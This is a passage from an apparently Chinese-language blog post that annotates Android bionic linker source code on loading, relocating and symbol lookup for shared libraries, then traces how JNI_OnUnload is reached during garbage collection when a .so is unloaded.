(d->d_un.d_val != sizeof(ElfW(Rela))) &#123; DL_ERR(\"invalid DT_RELAENT: %zd\", static_cast&lt;size_t>(d->d_un.d_val)); return false; &#125; break; // Ignored (see DT_RELCOUNT comments for details). case DT_RELACOUNT: break; case DT_REL: DL_ERR(\"unsupported DT_REL in \\\"%s\\\"\", get_realpath()); return false; case DT_RELSZ: DL_ERR(\"unsupported DT_RELSZ in \\\"%s\\\"\", get_realpath()); return false;#else case DT_REL: rel_ = reinterpret_cast&lt;ElfW(Rel)*>(load_bias + d->d_un.d_ptr); break; case DT_RELSZ: rel_count_ = d->d_un.d_val / sizeof(ElfW(Rel)); break; case DT_RELENT: if (d->d_un.d_val != sizeof(ElfW(Rel))) &#123; DL_ERR(\"invalid DT_RELENT: %zd\", static_cast&lt;size_t>(d->d_un.d_val)); return false; &#125; break; case DT_ANDROID_REL: android_relocs_ = reinterpret_cast&lt;uint8_t*>(load_bias + d->d_un.d_ptr); break; case DT_ANDROID_RELSZ: android_relocs_size_ = d->d_un.d_val; break; case DT_ANDROID_RELA: DL_ERR(\"unsupported DT_ANDROID_RELA in \\\"%s\\\"\", get_realpath()); return false; case DT_ANDROID_RELASZ: DL_ERR(\"unsupported DT_ANDROID_RELASZ in \\\"%s\\\"\", get_realpath()); return false; // \"Indicates that all RELATIVE relocations have been concatenated together, // and specifies the RELATIVE relocation count.\" // // TODO: Spec also mentions that this can be used to optimize relocation process; // Not currently used by bionic linker - ignored. case DT_RELCOUNT: break; case DT_RELA: DL_ERR(\"unsupported DT_RELA in \\\"%s\\\"\", get_realpath()); return false; case DT_RELASZ: DL_ERR(\"unsupported DT_RELASZ in \\\"%s\\\"\", get_realpath()); return false;#endif case DT_RELR: case DT_ANDROID_RELR: relr_ = reinterpret_cast&lt;ElfW(Relr)*>(load_bias + d->d_un.d_ptr); break; case DT_RELRSZ: case DT_ANDROID_RELRSZ: relr_count_ = d->d_un.d_val / sizeof(ElfW(Relr)); break; case DT_RELRENT: case DT_ANDROID_RELRENT: if (d->d_un.d_val != sizeof(ElfW(Relr))) &#123; DL_ERR(\"invalid DT_RELRENT: %zd\", static_cast&lt;size_t>(d->d_un.d_val)); return false; &#125; break; // Ignored (see DT_RELCOUNT comments for details). // There is no DT_RELRCOUNT specifically because it would only be ignored. case DT_ANDROID_RELRCOUNT: break; case DT_INIT: init_func_ = reinterpret_cast&lt;linker_ctor_function_t>(load_bias + d->d_un.d_ptr); DEBUG(\"%s constructors (DT_INIT) found at %p\", get_realpath(), init_func_); break; case DT_FINI: fini_func_ = reinterpret_cast&lt;linker_dtor_function_t>(load_bias + d->d_un.d_ptr); DEBUG(\"%s destructors (DT_FINI) found at %p\", get_realpath(), fini_func_); break; case DT_INIT_ARRAY: init_array_ = reinterpret_cast&lt;linker_ctor_function_t*>(load_bias + d->d_un.d_ptr); DEBUG(\"%s constructors (DT_INIT_ARRAY) found at %p\", get_realpath(), init_array_); break; case DT_INIT_ARRAYSZ: init_array_count_ = static_cast&lt;uint32_t>(d->d_un.d_val) / sizeof(ElfW(Addr)); break; case DT_FINI_ARRAY: fini_array_ = reinterpret_cast&lt;linker_dtor_function_t*>(load_bias + d->d_un.d_ptr); DEBUG(\"%s destructors (DT_FINI_ARRAY) found at %p\", get_realpath(), fini_array_); break; case DT_FINI_ARRAYSZ: fini_array_count_ = static_cast&lt;uint32_t>(d->d_un.d_val) / sizeof(ElfW(Addr)); break; case DT_PREINIT_ARRAY: preinit_array_ = reinterpret_cast&lt;linker_ctor_function_t*>(load_bias + d->d_un.d_ptr); DEBUG(\"%s constructors (DT_PREINIT_ARRAY) found at %p\", get_realpath(), preinit_array_); break; case DT_PREINIT_ARRAYSZ: preinit_array_count_ = static_cast&lt;uint32_t>(d->d_un.d_val) / sizeof(ElfW(Addr)); break; case DT_TEXTREL:#if defined(__LP64__) DL_ERR(\"\\\"%s\\\" has text relocations\", get_realpath()); return false;#else has_text_relocations = true; break;#endif case DT_SYMBOLIC: has_DT_SYMBOLIC = true; break; case DT_NEEDED: ++needed_count; break; case DT_FLAGS: if (d->d_un.d_val &amp; DF_TEXTREL) &#123;#if defined(__LP64__) DL_ERR(\"\\\"%s\\\" has text relocations\", get_realpath()); return false;#else has_text_relocations = true;#endif &#125; if (d->d_un.d_val &amp; DF_SYMBOLIC) &#123; has_DT_SYMBOLIC = true; &#125; break; case DT_FLAGS_1: set_dt_flags_1(d->d_un.d_val); if ((d->d_un.d_val &amp; ~SUPPORTED_DT_FLAGS_1) != 0) &#123; DL_WARN(\"Warning: \\\"%s\\\" has unsupported flags DT_FLAGS_1=%p \" \"(ignoring unsupported flags)\", get_realpath(), reinterpret_cast&lt;void*>(d->d_un.d_val)); &#125; break; // Ignored: \"Its use has been superseded by the DF_BIND_NOW flag\" case DT_BIND_NOW: break; case DT_VERSYM: versym_ = reinterpret_cast&lt;ElfW(Versym)*>(load_bias + d->d_un.d_ptr); break; case DT_VERDEF: verdef_ptr_ = load_bias + d->d_un.d_ptr; break; case DT_VERDEFNUM: verdef_cnt_ = d->d_un.d_val; break; case DT_VERNEED: verneed_ptr_ = load_bias + d->d_un.d_ptr; break; case DT_VERNEEDNUM: verneed_cnt_ = d->d_un.d_val; break; case DT_RUNPATH: // this is parsed after we have strtab initialized (see below). break; case DT_TLSDESC_GOT: case DT_TLSDESC_PLT: // These DT entries are used for lazy TLSDESC relocations. Bionic // resolves everything eagerly, so these can be ignored. break;#if defined(__aarch64__) case DT_AARCH64_BTI_PLT: case DT_AARCH64_PAC_PLT: case DT_AARCH64_VARIANT_PCS: // Ignored: AArch64 processor-specific dynamic array tags. break;#endif default: if (!relocating_linker) &#123; const char* tag_name; if (d->d_tag == DT_RPATH) &#123; tag_name = \"DT_RPATH\"; &#125; else if (d->d_tag == DT_ENCODING) &#123; tag_name = \"DT_ENCODING\"; &#125; else if (d->d_tag >= DT_LOOS &amp;&amp; d->d_tag &lt;= DT_HIOS) &#123; tag_name = \"unknown OS-specific\"; &#125; else if (d->d_tag >= DT_LOPROC &amp;&amp; d->d_tag &lt;= DT_HIPROC) &#123; tag_name = \"unknown processor-specific\"; &#125; else &#123; tag_name = \"unknown\"; &#125; DL_WARN(\"Warning: \\\"%s\\\" unused DT entry: %s (type %p arg %p) (ignoring)\", get_realpath(), tag_name, reinterpret_cast&lt;void*>(d->d_tag), reinterpret_cast&lt;void*>(d->d_un.d_val)); &#125; break; &#125; &#125; DEBUG(\"si->base = %p, si->strtab = %p, si->symtab = %p\", reinterpret_cast&lt;void*>(base), strtab_, symtab_); // Validity checks. if (relocating_linker &amp;&amp; needed_count != 0) &#123; DL_ERR(\"linker cannot have DT_NEEDED dependencies on other libraries\"); return false; &#125; if (nbucket_ == 0 &amp;&amp; gnu_nbucket_ == 0) &#123; DL_ERR(\"empty/missing DT_HASH/DT_GNU_HASH in \\\"%s\\\" \" \"(new hash type from the future?)\", get_realpath()); return false; &#125; if (strtab_ == nullptr) &#123; DL_ERR(\"empty/missing DT_STRTAB in \\\"%s\\\"\", get_realpath()); return false; &#125; if (symtab_ == nullptr) &#123; DL_ERR(\"empty/missing DT_SYMTAB in \\\"%s\\\"\", get_realpath()); return false; &#125; // Second pass - parse entries relying on strtab. Skip this while relocating the linker so as to // avoid doing heap allocations until later in the linker's initialization. if (!relocating_linker) &#123; for (ElfW(Dyn)* d = dynamic; d->d_tag != DT_NULL; ++d) &#123; switch (d->d_tag) &#123; case DT_SONAME: set_soname(get_string(d->d_un.d_val)); break; case DT_RUNPATH: set_dt_runpath(get_string(d->d_un.d_val)); break; &#125; &#125; &#125; // Before M release, linker was using basename in place of soname. In the case when DT_SONAME is // absent some apps stop working because they can't find DT_NEEDED library by soname. This // workaround should keep them working. (Applies only for apps targeting sdk version &lt; M.) Make // an exception for the main executable, which does not need to have DT_SONAME. The linker has an // DT_SONAME but the soname_ field is initialized later on. if (soname_.empty() &amp;&amp; this != solist_get_somain() &amp;&amp; !relocating_linker &amp;&amp; get_application_target_sdk_version() &lt; 23) &#123; soname_ = basename(realpath_.c_str()); DL_WARN_documented_change(23, \"missing-soname-enforced-for-api-level-23\", \"\\\"%s\\\" has no DT_SONAME (will use %s instead)\", get_realpath(), soname_.c_str()); // Don't call add_dlwarning because a missing DT_SONAME isn't important enough to show in the UI &#125; // Validate each library's verdef section once, so we don't have to validate // it each time we look up a symbol with a version. if (!validate_verdef_section(this)) return false; flags_ |= FLAG_PRELINKED; return true;&#125;# 构造全局组 这一步为预链接的依赖库设置 DF_1_GLOBAL 全局标志，来标记这个库在全局组中 // Step 4: Construct the global group. DF_1_GLOBAL bit is force set for LD_PRELOADed libs because// they must be added to the global group. Note: The DF_1_GLOBAL bit for a library is normally set// in step 3.if (ld_preloads != nullptr) &#123; for (auto&amp;&amp; si : *ld_preloads) &#123; si->set_dt_flags_1(si->get_dt_flags_1() | DF_1_GLOBAL); &#125;&#125;# 收集 local_groups 的根节点 看注释感觉挺抽象的，感觉是为了保证可以链接到别的 namespace 里面的依赖库 // Step 5: Collect roots of local_groups.// Whenever needed_by->si link crosses a namespace boundary it forms its own local_group.// Here we collect new roots to link them separately later on. Note that we need to avoid// collecting duplicates. Also the order is important. They need to be linked in the same// BFS order we link individual libraries.std::vector&lt;soinfo*> local_group_roots;if (start_with != nullptr &amp;&amp; add_as_children) &#123; local_group_roots.push_back(start_with);&#125; else &#123; CHECK(soinfos_count == 1); local_group_roots.push_back(soinfos[0]);&#125;for (auto&amp;&amp; task : load_tasks) &#123; soinfo* si = task->get_soinfo(); soinfo* needed_by = task->get_needed_by(); bool is_dt_needed = needed_by != nullptr &amp;&amp; (needed_by != start_with || add_as_children); android_namespace_t* needed_by_ns = is_dt_needed ? needed_by->get_primary_namespace() : ns; if (!si->is_linked() &amp;&amp; si->get_primary_namespace() != needed_by_ns) &#123; auto it = std::find(local_group_roots.begin(), local_group_roots.end(), si); LD_LOG(kLogDlopen, \"Crossing namespace boundary (si=%s@%p, si_ns=%s@%p, needed_by=%s@%p, ns=%s@%p, needed_by_ns=%s@%p) adding to local_group_roots: %s\", si->get_realpath(), si, si->get_primary_namespace()->get_name(), si->get_primary_namespace(), needed_by == nullptr ? \"(nullptr)\" : needed_by->get_realpath(), needed_by, ns->get_name(), ns, needed_by_ns->get_name(), needed_by_ns, it == local_group_roots.end() ? \"yes\" : \"no\"); if (it == local_group_roots.end()) &#123; local_group_roots.push_back(si); &#125; &#125;&#125;# 链接所有的 local groups // Step 6: Link all local groupsfor (auto root : local_group_roots) &#123; soinfo_list_t local_group; android_namespace_t* local_group_ns = root->get_primary_namespace(); walk_dependencies_tree(root, [&amp;] (soinfo* si) &#123; if (local_group_ns->is_accessible(si)) &#123; local_group.push_back(si); return kWalkContinue; &#125; else &#123; return kWalkSkip; &#125; &#125;); // 获取全局组包含的 soinfo，因为预加载库是一起加载的跟 local_group_ns 是同一个命名空间 // 所有这里的全局组已经包含了预加载库 soinfo_list_t global_group = local_group_ns->get_global_group(); // 将本地组和全局组都添加到 lookup_list 中 SymbolLookupList lookup_list(global_group, local_group); soinfo* local_group_root = local_group.front(); bool linked = local_group.visit([&amp;](soinfo* si) &#123; // Even though local group may contain accessible soinfos from other namespaces // we should avoid linking them (because if they are not linked -> they // are in the local_group_roots and will be linked later). if (!si->is_linked() &amp;&amp; si->get_primary_namespace() == local_group_ns) &#123; const android_dlextinfo* link_extinfo = nullptr; if (si == soinfos[0] || reserved_address_recursive) &#123; // Only forward extinfo for the first library unless the recursive // flag is set. link_extinfo = extinfo; &#125; if (__libc_shared_globals()->load_hook) &#123; __libc_shared_globals()->load_hook(si->load_bias, si->phdr, si->phnum); &#125; lookup_list.set_dt_symbolic_lib(si->has_DT_SYMBOLIC ? si : nullptr); // 调用 link_image 开始进行依赖库的动态链接，重定位等工作 if (!si->link_image(lookup_list, local_group_root, link_extinfo, &amp;relro_fd_offset) || !get_cfi_shadow()->AfterLoad(si, solist_get_head())) &#123; return false; &#125; &#125; return true; &#125;); if (!linked) &#123; return false; &#125;&#125;当把所有的本地组和全局组加入到 lookup_list 中后，就开始调用 si-&gt;link_image 来对这些库进行链接的操作 bool soinfo::link_image(const SymbolLookupList&amp; lookup_list, soinfo* local_group_root, const android_dlextinfo* extinfo, size_t* relro_fd_offset) &#123; if (is_image_linked()) &#123; // already linked. return true; &#125; if (g_is_ldd &amp;&amp; !is_main_executable()) &#123; async_safe_format_fd(STDOUT_FILENO, \"\\t%s => %s (%p)\\n\", get_soname(), get_realpath(), reinterpret_cast&lt;void*>(base)); &#125; local_group_root_ = local_group_root; if (local_group_root_ == nullptr) &#123; local_group_root_ = this; &#125; if ((flags_ &amp; FLAG_LINKER) == 0 &amp;&amp; local_group_root_ == this) &#123; target_sdk_version_ = get_application_target_sdk_version(); &#125;... // 进行符号的重定位 if (!relocate(lookup_list)) &#123; return false; &#125; DEBUG(\"[ finished linking %s ]\", get_realpath());...&#125;在 soinfo::link_image 中调用了 relocate 去进行符号的重定位 //android-platform\\bionic\\linker\\linker_relocate.cppbool soinfo::relocate(const SymbolLookupList&amp; lookup_list) &#123; VersionTracker version_tracker; if (!version_tracker.init(this)) &#123; return false; &#125; Relocator relocator(version_tracker, lookup_list); relocator.si = this; //`.strtab` 节保存的是符号字符串表，表中的内容会被 `.symtab` 的 `ElfN_Sym` 结构中的 `st_name` 引用 relocator.si_strtab = strtab_; relocator.si_strtab_size = has_min_version(1) ? strtab_size_ : SIZE_MAX; //`.symtab` 节是一个 `ElfN_Sym` 的数组，保存了符号信息 relocator.si_symtab = symtab_; relocator.tlsdesc_args = &amp;tlsdesc_args_; relocator.tls_tp_base = __libc_shared_globals()->static_tls_layout.offset_thread_pointer(); ////android_relocs_在 prelink_image () 中设置，动态节有 DT_ANDROID_REL 才会设置 if (android_relocs_ != nullptr) &#123; // check signature if (android_relocs_size_ > 3 &amp;&amp; android_relocs_[0] == 'A' &amp;&amp; android_relocs_[1] == 'P' &amp;&amp; android_relocs_[2] == 'S' &amp;&amp; android_relocs_[3] == '2') &#123; DEBUG(\"[ android relocating %s ]\", get_realpath()); const uint8_t* packed_relocs = android_relocs_ + 4; const size_t packed_relocs_size = android_relocs_size_ - 4; if (!packed_relocate&lt;RelocMode::Typical>(relocator, sleb128_decoder(packed_relocs, packed_relocs_size))) &#123; return false; &#125; &#125; else &#123; DL_ERR(\"bad android relocation header.\"); return false; &#125; &#125; if (relr_ != nullptr) &#123; DEBUG(\"[ relocating %s relr ]\", get_realpath()); if (!relocate_relr()) &#123; return false; &#125; &#125;#if defined(USE_RELA) if (rela_ != nullptr) &#123; DEBUG(\"[ relocating %s rela ]\", get_realpath()); if (!plain_relocate&lt;RelocMode::Typical>(relocator, rela_, rela_count_)) &#123; return false; &#125; &#125; if (plt_rela_ != nullptr) &#123; DEBUG(\"[ relocating %s plt rela ]\", get_realpath()); if (!plain_relocate&lt;RelocMode::JumpTable>(relocator, plt_rela_, plt_rela_count_)) &#123; return false; &#125; &#125;#else if (rel_ != nullptr) &#123; DEBUG(\"[ relocating %s rel ]\", get_realpath()); if (!plain_relocate&lt;RelocMode::Typical>(relocator, rel_, rel_count_)) &#123; return false; &#125; &#125; if (plt_rel_ != nullptr) &#123; DEBUG(\"[ relocating %s plt rel ]\", get_realpath()); if (!plain_relocate&lt;RelocMode::JumpTable>(relocator, plt_rel_, plt_rel_count_)) &#123; return false; &#125; &#125;#endif // Once the tlsdesc_args_ vector's size is finalized, we can write the addresses of its elements // into the TLSDESC relocations.#if defined(__aarch64__) // Bionic currently only implements TLSDESC for arm64. for (const std::pair&lt;TlsDescriptor*, size_t>&amp; pair : relocator.deferred_tlsdesc_relocs) &#123; TlsDescriptor* desc = pair.first; desc->func = tlsdesc_resolver_dynamic; desc->arg = reinterpret_cast&lt;size_t>(&amp;tlsdesc_args_[pair.second]); &#125;#endif return true;&#125;随后依次调用了 plain_relocate-&gt;plain_relocate_impl-&gt;process_relocation template &lt;RelocMode OptMode, typename ...Args>static bool plain_relocate(Relocator&amp; relocator, Args ...args) &#123; return needs_slow_relocate_loop(relocator) ? plain_relocate_impl&lt;RelocMode::General>(relocator, args...) : plain_relocate_impl&lt;OptMode>(relocator, args...);&#125;template &lt;RelocMode Mode>__attribute__((noinline))static bool plain_relocate_impl(Relocator&amp; relocator, rel_t* rels, size_t rel_count) &#123; for (size_t i = 0; i &lt; rel_count; ++i) &#123; if (!process_relocation&lt;Mode>(relocator, rels[i])) &#123; return false; &#125; &#125; return true;&#125;template &lt;RelocMode Mode>__attribute__((always_inline))static inline bool process_relocation(Relocator&amp; relocator, const rel_t&amp; reloc) &#123; return Mode == RelocMode::General ? process_relocation_general(relocator, reloc) : process_relocation_impl&lt;Mode>(relocator, reloc);&#125;最终在 process_relocation_impl 实现了符号的重定向并调用 lookup_symbol 来查找符号 template &lt;RelocMode Mode>__attribute__((always_inline))static bool process_relocation_impl(Relocator&amp; relocator, const rel_t&amp; reloc) &#123; constexpr bool IsGeneral = Mode == RelocMode::General; void* const rel_target = reinterpret_cast&lt;void*>(reloc.r_offset + relocator.si->load_bias); const uint32_t r_type = ELFW(R_TYPE)(reloc.r_info); const uint32_t r_sym = ELFW(R_SYM)(reloc.r_info); soinfo* found_in = nullptr; const ElfW(Sym)* sym = nullptr; const char* sym_name = nullptr; ElfW(Addr) sym_addr = 0; if (r_sym != 0) &#123; // 获取重定向的符号名 sym_name = relocator.get_string(relocator.si_symtab[r_sym].st_name); &#125; ...#if defined(USE_RELA) auto get_addend_rel = [&amp;]() -> ElfW(Addr) &#123; return reloc.r_addend; &#125;; auto get_addend_norel = [&amp;]() -> ElfW(Addr) &#123; return reloc.r_addend; &#125;;#else auto get_addend_rel = [&amp;]() -> ElfW(Addr) &#123; return *static_cast&lt;ElfW(Addr)*>(rel_target); &#125;; auto get_addend_norel = [&amp;]() -> ElfW(Addr) &#123; return 0; &#125;;#endif if (IsGeneral &amp;&amp; is_tls_reloc(r_type)) &#123; ... &#125; else &#123; if (r_sym == 0) &#123; // Do nothing. &#125; else &#123; // 利用 lookup_symbol 来查找符号 if (!lookup_symbol&lt;IsGeneral>(relocator, r_sym, sym_name, &amp;found_in, &amp;sym)) return false; if (sym != nullptr) &#123; const bool should_protect_segments = handle_text_relocs &amp;&amp; found_in == relocator.si &amp;&amp; ELF_ST_TYPE(sym->st_info) == STT_GNU_IFUNC; if (should_protect_segments &amp;&amp; !protect_segments()) return false; sym_addr = found_in->resolve_symbol_address(sym); if (should_protect_segments &amp;&amp; !unprotect_segments()) return false; &#125; else if constexpr (IsGeneral) &#123; // A weak reference to an undefined symbol. We typically use a zero symbol address, but // use the relocation base for PC-relative relocations, so that the value written is zero. switch (r_type) &#123;#if defined(__x86_64__) case R_X86_64_PC32: sym_addr = reinterpret_cast&lt;ElfW(Addr)>(rel_target); break;#elif defined(__i386__) case R_386_PC32: sym_addr = reinterpret_cast&lt;ElfW(Addr)>(rel_target); break;#endif &#125; &#125; &#125; &#125; // 大部分符号的类型都是 R_GENERIC_JUMP_SLOT if constexpr (IsGeneral || Mode == RelocMode::JumpTable) &#123; if (r_type == R_GENERIC_JUMP_SLOT) &#123; count_relocation_if&lt;IsGeneral>(kRelocAbsolute); const ElfW(Addr) result = sym_addr + get_addend_norel(); trace_reloc(\"RELO JMP_SLOT %16p &lt;- %16p %s\", rel_target, reinterpret_cast&lt;void*>(result), sym_name); *static_cast&lt;ElfW(Addr)*>(rel_target) = result; return true; &#125; &#125; 其他类型或架构的相关重定向计算省略 ...&#125;在 lookup_symbol 中调用了 soinfo_do_lookup 来查找符号 template &lt;bool DoLogging>__attribute__((always_inline))static inline bool lookup_symbol(Relocator&amp; relocator, uint32_t r_sym, const char* sym_name, soinfo** found_in, const ElfW(Sym)** sym) &#123; //relocator 是前面传进来包含全局组和本地组的 soinfos，全局组排在最前面 // 如果上一次已经查找过这个符号，那么久没有必要再查找一次 if (r_sym == relocator.cache_sym_val) &#123; *found_in = relocator.cache_si; *sym = relocator.cache_sym; count_relocation_if&lt;DoLogging>(kRelocSymbolCached); &#125; else &#123; const version_info* vi = nullptr; if (!relocator.si->lookup_version_info(relocator.version_tracker, r_sym, sym_name, &amp;vi)) &#123; return false; &#125; soinfo* local_found_in = nullptr; // 最终调用 soinfo_do_lookup 来查找符号 const ElfW(Sym)* local_sym = soinfo_do_lookup(sym_name, vi, &amp;local_found_in, relocator.lookup_list); relocator.cache_sym_val = r_sym; relocator.cache_si = local_found_in; relocator.cache_sym = local_sym; *found_in = local_found_in; *sym = local_sym; &#125; if (*sym == nullptr) &#123; if (ELF_ST_BIND(relocator.si_symtab[r_sym].st_info) != STB_WEAK) &#123; DL_ERR(\"cannot locate symbol \\\"%s\\\" referenced by \\\"%s\\\"...\", sym_name, relocator.si->get_realpath()); return false; &#125; &#125; count_relocation_if&lt;DoLogging>(kRelocSymbol); return true;&#125;在 soinfo_do_lookup 中最终调用模板函数 soinfo_do_lookup_impl 进行符号查找 //android-platform\\bionic\\linker\\linker_soinfo.cppconst ElfW(Sym)* soinfo_do_lookup(const char* name, const version_info* vi, soinfo** si_found_in, const SymbolLookupList&amp; lookup_list) &#123; return lookup_list.needs_slow_path() ? soinfo_do_lookup_impl&lt;true>(name, vi, si_found_in, lookup_list) : soinfo_do_lookup_impl&lt;false>(name, vi, si_found_in, lookup_list);&#125;有 hash 表查 hash 表，没 hash 表用符号查找 template &lt;bool IsGeneral>__attribute__((noinline)) static const ElfW(Sym)*soinfo_do_lookup_impl(const char* name, const version_info* vi, soinfo** si_found_in, const SymbolLookupList&amp; lookup_list) &#123; const auto [ hash, name_len ] = calculate_gnu_hash(name); constexpr uint32_t kBloomMaskBits = sizeof(ElfW(Addr)) * 8; SymbolName elf_symbol_name(name); const SymbolLookupLib* end = lookup_list.end(); const SymbolLookupLib* it = lookup_list.begin(); while (true) &#123; const SymbolLookupLib* lib; uint32_t sym_idx; // Iterate over libraries until we find one whose Bloom filter matches the symbol we're // searching for. // 在每一个库中都去寻找有没有指定的符号 while (true) &#123; if (it == end) return nullptr; lib = it++; // 要是没有 hash 表，就通过名称来进行查找 if (IsGeneral &amp;&amp; lib->needs_sysv_lookup()) &#123; if (const ElfW(Sym)* sym = lib->si_->find_symbol_by_name(elf_symbol_name, vi)) &#123; *si_found_in = lib->si_; return sym; &#125; continue; &#125; if (IsGeneral) &#123; TRACE_TYPE(LOOKUP, \"SEARCH %s in %s@%p (gnu)\", name, lib->si_->get_realpath(), reinterpret_cast&lt;void*>(lib->si_->base)); &#125; // 计算符号 hash 桶查询链 const uint32_t word_num = (hash / kBloomMaskBits) &amp; lib->gnu_maskwords_; const ElfW(Addr) bloom_word = lib->gnu_bloom_filter_[word_num]; const uint32_t h1 = hash % kBloomMaskBits; const uint32_t h2 = (hash >> lib->gnu_shift2_) % kBloomMaskBits; if ((1 &amp; (bloom_word >> h1) &amp; (bloom_word >> h2)) == 1) &#123; sym_idx = lib->gnu_bucket_[hash % lib->gnu_nbucket_]; if (sym_idx != 0) &#123; break; &#125; &#125; if (IsGeneral) &#123; TRACE_TYPE(LOOKUP, \"NOT FOUND %s in %s@%p\", name, lib->si_->get_realpath(), reinterpret_cast&lt;void*>(lib->si_->base)); &#125; &#125; // Search the library's hash table chain. ElfW(Versym) verneed = kVersymNotNeeded; bool calculated_verneed = false; uint32_t chain_value = 0; const ElfW(Sym)* sym = nullptr; //// 根据符号 hash 快速查找 do &#123; sym = lib->symtab_ + sym_idx; chain_value = lib->gnu_chain_[sym_idx]; if ((chain_value >> 1) == (hash >> 1)) &#123; if (vi != nullptr &amp;&amp; !calculated_verneed) &#123; calculated_verneed = true; verneed = find_verdef_version_index(lib->si_, vi); &#125; if (check_symbol_version(lib->versym_, sym_idx, verneed) &amp;&amp; static_cast&lt;size_t>(sym->st_name) + name_len + 1 &lt;= lib->strtab_size_ &amp;&amp; memcmp(lib->strtab_ + sym->st_name, name, name_len + 1) == 0 &amp;&amp; is_symbol_global_and_defined(lib->si_, sym)) &#123; *si_found_in = lib->si_; if (IsGeneral) &#123; TRACE_TYPE(LOOKUP, \"FOUND %s in %s (%p) %zd\", name, lib->si_->get_realpath(), reinterpret_cast&lt;void*>(sym->st_value), static_cast&lt;size_t>(sym->st_size)); &#125; return sym; &#125; &#125; ++sym_idx; &#125; while ((chain_value &amp; 1) == 0); if (IsGeneral) &#123; TRACE_TYPE(LOOKUP, \"NOT FOUND %s in %s@%p\", name, lib->si_->get_realpath(), reinterpret_cast&lt;void*>(lib->si_->base)); &#125; &#125;&#125;# 收尾工作 对依赖库的链接情况进行标记，并增加依赖库的引用计数 // Step 7: Mark all load_tasks as linked and increment refcounts // for references between load_groups (at this point it does not matter if // referenced load_groups were loaded by previous dlopen or as part of this // one on step 6) if (start_with != nullptr &amp;&amp; add_as_children) &#123; start_with->set_linked(); &#125; for (auto&amp;&amp; task : load_tasks) &#123; soinfo* si = task->get_soinfo(); si->set_linked(); &#125; for (auto&amp;&amp; task : load_tasks) &#123; soinfo* si = task->get_soinfo(); soinfo* needed_by = task->get_needed_by(); if (needed_by != nullptr &amp;&amp; needed_by != start_with &amp;&amp; needed_by->get_local_group_root() != si->get_local_group_root()) &#123; // 增加依赖库 so 的引用计数 si->increment_ref_count(); &#125; &#125;至此为止，一个 so 就被成功的加载进来了～ # so 的卸载过程 在 android 中并没有直接的接口来让开发者卸载一个 so, 所以对于 so 的卸载过程我们无法使用自上而下的方式去分析，但可以利用逆向的方法，自底向上一步一步探索 so 的卸载过程究竟是什么样子的 首先整理一下目前为止从 AOSP 源码以及网上找的线索: android 的 so 中有一个独特的函数 JNI_OnUnload , 当 so 卸载时会进行调用 在 AOSP 的 platform\\bionic\\linker\\linker_soinfo.cpp 中有一个函数 call_destructors , 它的完整代码如下 //platform\\bionic\\linker\\linker_soinfo.cppvoid soinfo::call_destructors() &#123; if (!constructors_called) &#123; return; &#125; ScopedTrace trace((std::string(\"calling destructors: \") + get_realpath()).c_str()); // DT_FINI_ARRAY must be parsed in reverse order. call_array(\"DT_FINI_ARRAY\", fini_array_, fini_array_count_, true, get_realpath()); // DT_FINI should be called after DT_FINI_ARRAY if both are present. call_function(\"DT_FINI\", fini_func_, get_realpath());&#125;当调用该函数时，会先调用 final_array 中的函数，最后调用 final 函数 (怎么和 init 与 init_array 反过来了) 那么我们可以提出以下两个问题，来为逆向分析的过程明确一个清晰的目标 在什么情况下 JNI_OnUnload 与 call_destructors 会被调用？ JNI_OnUnload 和 call_destructors 调用的先后顺序是什么？ 带着这两个问题，我们首先对 JNI_OnUnload 进行分析 # JNI_OnUnload # UnloadLibraries android 中存在一个特有的函数 JNI_OnUnload , 当虚拟机释放该 so 时，来进行善后清除动作，通过在 android 官网源码搜索平台翻了好多页的搜索结果，终于找到了 JNI_OnUnload 的调用函数，他在 art/runtime/jni/java_vm_ext.cc 中的 UnloadLibraries 中被调用 //platform\\art\\runtime\\jni\\java_vm_ext.ccstatic void UnloadLibraries(JavaVM* vm, const std::vector&lt;SharedLibrary*>&amp; libraries) &#123; using JNI_OnUnloadFn = void(*)(JavaVM*, void*); for (SharedLibrary* library : libraries) &#123; void* const sym = library->FindSymbol(\"JNI_OnUnload\", nullptr, android::kJNICallTypeRegular); if (sym == nullptr) &#123; VLOG(jni) &lt;&lt; \"[No JNI_OnUnload found in \\\"\" &lt;&lt; library->GetPath() &lt;&lt; \"\\\"]\"; &#125; else &#123; VLOG(jni) &lt;&lt; \"[JNI_OnUnload found for \\\"\" &lt;&lt; library->GetPath() &lt;&lt; \"\\\"]: Calling...\"; JNI_OnUnloadFn jni_on_unload = reinterpret_cast&lt;JNI_OnUnloadFn>(sym); jni_on_unload(vm, nullptr); &#125; &#125;&#125;# UnloadNativeLibraries 再去看一下 UnloadLibraries 的引用，它在 UnloadNativeLibraries 被调用 //platform\\art\\runtime\\jni\\java_vm_ext.cc// Unload native libraries with cleared class loaders.void UnloadNativeLibraries() REQUIRES(!Locks::jni_libraries_lock_) REQUIRES_SHARED(Locks::mutator_lock_) &#123; Thread* const self = Thread::Current(); std::vector&lt;SharedLibrary*> unload_libraries; &#123; MutexLock mu(self, *Locks::jni_libraries_lock_); for (auto it = libraries_.begin(); it != libraries_.end(); ) &#123; SharedLibrary* const library = it->second; // If class loader is null then it was unloaded, call JNI_OnUnload. const jweak class_loader = library->GetClassLoader(); // If class_loader is a null jobject then it is the boot class loader. We should not unload // the native libraries of the boot class loader. if (class_loader != nullptr &amp;&amp; self->IsJWeakCleared(class_loader)) &#123; unload_libraries.push_back(library); it = libraries_.erase(it); &#125; else &#123; ++it; &#125; &#125; &#125; ScopedThreadSuspension sts(self, kNative); // Do this without holding the jni libraries lock to prevent possible deadlocks. // 调用 so 中的 JNI_OnUnload UnloadLibraries(self->GetJniEnv()->GetVm(), unload_libraries); for (auto library : unload_libraries) &#123; delete library; &#125;&#125;# JavaVMExt::UnloadNativeLibraries 这里调用了 libraries_ 中的 UnloadNativeLibraries 函数，看起来卸载的过程和 Java 虚拟机有些许的关系 //platform\\art\\runtime\\jni\\java_vm_ext.ccvoid JavaVMExt::UnloadNativeLibraries() &#123; libraries_.get()->UnloadNativeLibraries();&#125;# Heap::CollectGarbageInternal JavaVMExt::UnloadNativeLibraries 在 Heap::CollectGarbageInternal 的末尾被调用 这函数看起来和虚拟机堆执行垃圾回收有关，垃圾回收执行完毕后会去调用 JNI_OnUnload 然而再往上寻找却找不到什么有用的函数了，我们只知道在 JVM 垃圾回收之后会去调用 JNI_OnUnload //platform\\art\\runtime\\gc\\heap.cccollector::GcType Heap::CollectGarbageInternal(collector::GcType gc_type, GcCause gc_cause, bool clear_soft_references, uint32_t requested_gc_num) &#123; Thread* self = Thread::Current(); Runtime* runtime = Runtime::Current(); // If the heap can't run the GC, silently fail 